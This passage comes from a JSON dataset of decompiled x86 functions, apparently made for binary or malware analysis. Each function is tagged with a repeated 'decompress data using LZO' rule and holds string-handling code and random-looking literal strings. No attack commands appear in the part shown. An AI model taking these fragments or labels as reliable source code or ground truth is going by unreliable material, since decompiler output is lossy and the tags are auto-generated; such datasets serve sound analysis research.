1) && (puVar2 = puStack72[-1],  0x1f < puStack72 + (-4 - puVar2)))\n            goto code_r0x00446f2e;\n            fcn.00401a32(puVar2);\n        }\n        *in_FS_OFFSET = piStack128;\n        return 0x1;\n    }\n    iVar3 = iStack184;\n    if ((uStack164 + 1 < 0x1000) || (iVar3 = *(iStack184 + -4),  (iStack184 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x00446e4a;\n    }\n    uStack120 = 0;\n    fcn.004047f5();\ncode_r0x00446f16:\n    uStack120 = 1;\n    fcn.004047f5();\ncode_r0x00446f22:\n    uStack120 = 2;\n    fcn.004047f5();\ncode_r0x00446f2e:\n    uStack120 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar2 = fcn.00403a76();\n    return puVar2;\n}\n",
        "token_count": 1979
    },
    "00401910": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00401910(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    int32_t in_stack_00000030;\n    uint32_t in_stack_00000044;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44ce20;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x45);\n    if (uStack40 < 0x10) {\ncode_r0x0044ad16:\n        if (0xf < in_stack_0000002c) {\n            iVar2 = in_stack_00000018;\n            if ((0xfff < in_stack_0000002c + 1) &&\n               (iVar2 = *(in_stack_00000018 + -4),  0x1f < (in_stack_00000018 + -4) - iVar2)) goto code_r0x0044adb8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000044) {\n            iVar2 = in_stack_00000030;\n            if ((0xfff < in_stack_00000044 + 1) &&\n               (iVar2 = *(in_stack_00000030 + -4),  0x1f < (in_stack_00000030 + -4) - iVar2)) goto code_r0x0044adc4;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0044ad16;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044adb8:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044adc4:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 687
    },
    "0040191f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.0040191f(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c200;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"hgtblpzgzizhxupwkicilpud\";\n    auStack120[0] = 0x18;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x18, iStack84, \"hgtblpzgzizhxupwkicilpud\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x18, uStack36, \"hgtblpzgzizhxupwkicilpud\");\n    if (uStack64 < 0x10) {\ncode_r0x004252b3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042536d;\n            fcn.00401a32(iVar2);\n        }\n        param_1[5] = 0xf;\n        param_1[4] = 0xc;\n        *param_1 = 0x65686b66;\n        param_1[1] = 0x636a7661;\n        param_1[2] = 0x6475796d;\n        *(param_1 + 3) = 0;\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00425379;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004252b3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042536d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00425379:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 910
    },
    "00401951": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00401951(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    uint uStack84;\n    ushort uStack80;\n    uchar uStack78;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &uStack84;\n    uStack24 = 0x44c210;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack64 = 0xf;\n    uStack68 = 6;\n    uStack84 = 0x6569656e;\n    uStack80 = 0x6679;\n    uStack78 = 0;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x58);\n    if (uStack40 < 0x10) {\ncode_r0x004254c8:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x00425567;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar1 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar1 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar1)) goto code_r0x00425573;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542044;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x004254c8;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00425567:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00425573:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 748
    },
    "0040459d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.0040459d(uchar *param_1)\n\n{\n    int32_t arg_8h;\n    uchar *puVar1;\n    uchar *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    float10 in_ST0;\n    float10 fVar2;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uchar *in_stack_0000001c;\n    uint in_stack_0000002c;\n    uint32_t in_stack_00000030;\n    uchar *in_stack_00000044;\n    uint32_t in_stack_00000058;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    uchar uStack160;\n    uchar *puStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uchar *puStack136;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uchar *puStack64;\n    uchar *puStack60;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uchar *in_stack_ffffffd8;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    puStack84 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c720;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar1 = &stack0xffffffe0;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x00435167:\n        puStack32 = puVar1;\n        in_stack_00000014 = 0;\n        in_stack_00000018 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (0xf < in_stack_00000030) {\n            puStack80 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (puStack80 = *(in_stack_0000001c + -4),  unaff_EDI = puStack80, \n               0x1f < in_stack_0000001c + (-4 - puStack80))) goto code_r0x00435211;\n            uStack44 = 0x4351a9;\n            in_ST0 = fcn.00401a32(puStack80);\n            in_stack_ffffffd8 = puStack80;\n        }\n        in_stack_0000002c = 0;\n        in_stack_00000030 = 0xf;\n        in_stack_0000001c = in_stack_0000001c & 0xffffff00;\n        if (in_stack_00000058 < 0x10) {\ncode_r0x004351f2:\n            *in_FS_OFFSET = iStack28;\n            return in_ST0;\n        }\n        puStack84 = in_stack_00000044;\n        if ((in_stack_00000058 + 1 < 0x1000) ||\n           (puStack84 = *(in_stack_00000044 + -4),  puStack80 = unaff_EDI,  in_stack_00000044 + (-4 - puStack84) < 0x20)\n           ) {\n            uStack44 = 0x4351ef;\n            in_ST0 = fcn.00401a32(puStack84);\n            goto code_r0x004351f2;\n        }\n    }\n    else {\n        puStack80 = param_1;\n        if ((in_stack_00000018 + 1 < 0x1000) ||\n           (puStack80 = *(param_1 + -4),  unaff_EDI = puStack80,  param_1 + (-4 - puStack80) < 0x20)) {\n            uStack44 = 0x435164;\n            puStack32 = &stack0xffffffe0;\n            in_ST0 = fcn.00401a32(puStack80);\n            in_stack_ffffffd8 = puStack80;\n            puVar1 = puStack32;\n            goto code_r0x00435167;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x00435211:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    puStack48 = 0x43523c;\n    fcn.004052d1();\n    puStack60 = 0x43524c;\n    puStack48 = &stack0x00000008;\n    fcn.004052d1();\n    puStack60 = &stack0x00000014;\n    fcn.004052d1();\n    puStack100 = &stack0xffffff9c;\n    puStack140 = &stack0xffffffc0;\n    uStack88 = 0xffffffff;\n    uStack92 = 0x44c730;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack136 = puStack80;\n    puVar1 = &stack0xffffff9c;\n    if (uStack44 < 0x10) {\ncode_r0x004352c3:\n        puStack100 = puVar1;\n        puStack48 = NULL;\n        uStack44 = 0xf;\n        puStack64 = puStack64 & 0xffffff00;\n        if (uStack20 < 0x10) {\ncode_r0x00435308:\n            *in_FS_OFFSET = iStack96;\n            return *0x542434;\n        }\n        puStack140 = in_stack_ffffffd8;\n        if ((uStack20 + 1 < 0x1000) ||\n           (puStack140 = *(in_stack_ffffffd8 + -4),  in_stack_ffffffd8 + (-4 - puStack140) < 0x20)) {\n            fcn.00401a32(puStack140);\n            goto code_r0x00435308;\n        }\n    }\n    else {\n        puStack136 = puStack64;\n        puVar1 = puStack80;\n        if ((uStack44 + 1 < 0x1000) ||\n           (puStack136 = *(puStack64 + -4),  puVar1 = puStack136,  puStack64 + (-4 - puStack136) < 0x20)) {\n            puStack100 = &stack0xffffff9c;\n            fcn.00401a32(puStack136);\n            puStack136 = puVar1;\n            puVar1 = puStack100;\n            goto code_r0x004352c3;\n        }\n        uStack88 = 0;\n        fcn.004047f5();\n    }\n    uStack88 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack156 = &stack0xffffff48;\n    uStack148 = 0x44c740;\n    iStack152 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff68;\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack144 = 2;\n    fVar2 = fcn.00402f72(0x52, uStack160, \n                         \"krquwbgvedkpmllcespkydaxkvcqlyrxwwvzntpuefppikcmlegtfwgvwritmimiozqbpctampgxzzxzzi\");\n    if (0xf < uStack164) {\n        arg_8h = iStack184;\n        if ((0xfff < uStack164 + 1) && (arg_8h = *(iStack184 + -4),  0x1f < (iStack184 + -4) - arg_8h)) {\n            uStack144 = 0;\n            fcn.004047f5();\n            goto code_r0x0043545a;\n        }\n        fVar2 = fcn.00401a32(arg_8h);\n    }\n    if (0xf < puStack64) {\n        puVar1 = puStack84;\n        if ((0xfff < puStack64 + 1) && (puVar1 = *(puStack84 + -4),  0x1f < puStack84 + (-4 - puVar1))) {\ncode_r0x0043545a:\n            uStack144 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fVar2 = fcn.00401a32(puVar1);\n    }\n    *in_FS_OFFSET = iStack152;\n    return fVar2;\n}\n",
        "token_count": 2029
    },
    "00401a2d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00401a2d(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44bfa0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x4d);\n    if (0xf < uStack40) {\n        iVar2 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar2 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0041e62f;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < in_stack_00000020) {\n        iVar2 = param_3;\n        if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2)) {\ncode_r0x0041e62f:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            uVar1 = fcn.00403a76();\n            return uVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0x8e68;\n}\n",
        "token_count": 498
    },
    "00402072": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402072(uint param_1, uint param_2, uint32_t param_3, uint32_t param_4, uint param_5, uint param_6, \n                 uint param_7, uint32_t param_8, uint32_t param_9, uchar *param_10)\n\n{\n    uchar **ppuVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t *arg_8h;\n    uint32_t uVar4;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EDI;\n    uint32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000038;\n    uint32_t in_stack_0000003c;\n    int32_t aiStack164 [4];\n    uint uStack148;\n    uint32_t uStack144;\n    int32_t iStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    int32_t *piStack88;\n    uint32_t *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    int32_t iStack52;\n    uchar **ppuStack32;\n    uint32_t *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c6c0;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (param_9 < 0x10) {\ncode_r0x004341f4:\n        ppuStack32 = ppuVar1;\n        param_8 = 0;\n        param_9 = 0xf;\n        param_4 = param_4 & 0xffffff00;\n        if (in_stack_0000003c < 0x10) {\ncode_r0x0043423a:\n            *in_FS_OFFSET = puStack28;\n            return 0;\n        }\n        puStack72 = param_10;\n        if ((in_stack_0000003c + 1 < 0x1000) || (puStack72 = *(param_10 + -4),  param_10 + (-4 - puStack72) < 0x20)) {\n            fcn.00401a32(puStack72);\n            goto code_r0x0043423a;\n        }\n    }\n    else {\n        uStack68 = param_4;\n        if ((param_9 + 1 < 0x1000) ||\n           (uStack68 = *(param_4 - 4),  unaff_EDI = uStack68,  (param_4 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x004341f4;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack88 = aiStack164;\n    uStack80 = 0x44c6d0;\n    puStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack84;\n    uStack148 = 0;\n    uStack144 = 0xf;\n    aiStack164[0] = 0;\n    uStack76 = 7;\n    fcn.00402f72(0x2e, iStack116, \"phftfskdayzbganivquaircrecnxegoxlsqxebuwkyvpnw\");\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 8;\n    fcn.00402f72(0x2e, iStack140, \"phftfskdayzbganivquaircrecnxegoxlsqxebuwkyvpnw\");\n    uStack124 = 0;\n    uStack120 = 0xf;\n    iStack140 = 0;\n    uStack76 = 9;\n    fcn.00402f72(0x2e, uStack92, \"phftfskdayzbganivquaircrecnxegoxlsqxebuwkyvpnw\");\n    if (uStack120 < 0x10) {\ncode_r0x004343bb:\n        if (0xf < uStack96) {\n            iVar3 = iStack116;\n            if ((0xfff < uStack96 + 1) && (iVar3 = *(iStack116 + -4),  0x1f < (iStack116 + -4) - iVar3))\n            goto code_r0x00434562;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack144) {\n            iVar3 = aiStack164[0];\n            if ((0xfff < uStack144 + 1) && (iVar3 = *(aiStack164[0] + -4),  0x1f < (aiStack164[0] + -4) - iVar3))\n            goto code_r0x0043456e;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < ppuStack32) {\n            iVar3 = iStack52;\n            if ((0xfff < ppuStack32 + 1) && (iVar3 = *(iStack52 + -4),  0x1f < (iStack52 + -4) - iVar3))\n            goto code_r0x0043457a;\n            fcn.00401a32(iVar3);\n        }\n        ppuStack32 = 0xf;\n        if (0xf < unaff_EBX) {\n            arg_8h = puStack28;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h = puStack28[-1],  0x1f < puStack28 + (-4 - arg_8h)))\n            goto code_r0x00434586;\n            fcn.00401a32(arg_8h);\n        }\n        puStack28 = puStack28 & 0xffffff00;\n        if (0xf < param_8) {\n            uVar4 = param_3;\n            if ((0xfff < param_8 + 1) && (uVar4 = *(param_3 - 4),  0x1f < (param_3 - 4) - uVar4)) goto code_r0x00434592;\n            fcn.00401a32(uVar4);\n        }\n        param_7 = 0;\n        param_8 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (0xf < in_stack_00000038) {\n            uVar4 = param_9;\n            if ((0xfff < in_stack_00000038 + 1) && (uVar4 = *(param_9 - 4),  0x1f < (param_9 - 4) - uVar4))\n            goto code_r0x0043459e;\n            fcn.00401a32(uVar4);\n        }\n        *in_FS_OFFSET = puStack84;\n        return 0;\n    }\n    iVar3 = iStack140;\n    if ((uStack120 + 1 < 0x1000) || (iVar3 = *(iStack140 + -4),  (iStack140 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x004343bb;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x00434562:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x0043456e:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x0043457a:\n    uStack76 = 3;\n    fcn.004047f5();\ncode_r0x00434586:\n    uStack76 = 4;\n    fcn.004047f5();\ncode_r0x00434592:\n    uStack76 = 5;\n    fcn.004047f5();\ncode_r0x0043459e:\n    uStack76 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar2 = fcn.00403a76();\n    return uVar2;\n}\n",
        "token_count": 2009
    },
    "00401a64": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00401a64(uint param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    int32_t in_stack_00000060;\n    uint32_t in_stack_00000074;\n    uint auStack108 [4];\n    uint uStack92;\n    uint uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack108;\n    uStack24 = 0x44ca50;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x36);\n    uStack88 = 0xf;\n    uStack92 = 0;\n    auStack108[0] = 0;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x36, uStack36, \"fraptlwlmxusmzqvutotehfxavapqytxeoiqnsolonvpgldaeqrhqu\");\n    if (uStack64 < 0x10) {\ncode_r0x0043e410:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0043e58a;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar1 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar1 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar1))\n            goto code_r0x0043e596;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar1 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar1 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar1)) goto code_r0x0043e5a2;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000005c) {\n            iVar1 = in_stack_00000048;\n            if ((0xfff < in_stack_0000005c + 1) &&\n               (iVar1 = *(in_stack_00000048 + -4),  0x1f < (in_stack_00000048 + -4) - iVar1)) goto code_r0x0043e5ae;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000074) {\n            iVar1 = in_stack_00000060;\n            if ((0xfff < in_stack_00000074 + 1) &&\n               (iVar1 = *(in_stack_00000060 + -4),  0x1f < (in_stack_00000060 + -4) - iVar1)) goto code_r0x0043e5ba;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542750;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043e410;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043e58a:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043e596:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043e5a2:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043e5ae:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0043e5ba:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 1287
    },
    "00401a73": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00401a73(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint auStack144 [2];\n    char *pcStack136;\n    uint uStack132;\n    uchar uStack128;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc00;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack136 = \"mpldtncladetfdpljzhf\";\n    auStack144[0] = 0x14;\n    fcn.00402f72();\n    uStack112 = 0xf;\n    uStack116 = 4;\n    uStack132 = 0x6c6a6d6c;\n    uStack128 = 0;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x14, iStack60, \"mpldtncladetfdpljzhf\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x14, uStack36, \"mpldtncladetfdpljzhf\");\n    if (uStack40 < 0x10) {\ncode_r0x0044323f:\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x004432d3;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x004432df;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542860;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0044323f;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004432d3:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004432df:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 876
    },
    "00401b9f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
